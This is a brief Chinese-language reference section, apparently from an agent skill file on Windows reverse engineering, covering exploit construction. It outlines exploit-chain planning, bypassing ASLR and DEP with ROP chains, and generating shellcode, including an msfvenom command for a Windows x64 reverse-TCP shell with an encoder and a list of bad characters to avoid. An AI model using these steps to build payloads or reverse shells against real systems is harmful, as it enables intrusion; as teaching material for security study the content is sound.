# 十一、漏洞利用构造

> 来源：CkSKILLS v1 `windows-reverse-engineering` §十一、漏洞利用构造（迁移至 v2 知识块）

### 1. 利用链规划
```
1. 漏洞类型：栈/堆/格式化/任意写/逻辑
2. 保护状态：ASLR/DEP/CFG/SafeSEH
3. 可用模块：无 ASLR 模块、可执行内存
4. 利用原语：控制 EIP/RIP、任意写、信息泄露
5. 链路：泄露基址 → 绕 ASLR → ROP → shellcode
```

### 2. ROP 构造
```
工具：ROPgadget --binary x.exe / ropper
绕 DEP：VirtualProtect / VirtualAlloc
链：pop reg; ret → 设置参数 → 调用函数
返回：jmp esp / 跳到 shellcode
```

### 3. Shellcode
```
生成：msfvenom -p windows/x64/shell_reverse_tcp LHOST= LPORT= -f c
编码：msfvenom -e x86/shikata_ga_nai -i 5
约束：避免坏字符 \x00 \x0a \x0d \xff
存放：.data 段 / 堆 / jitter 到可执行内存
替代：纯 ROP 实现功能（更稳定）
```
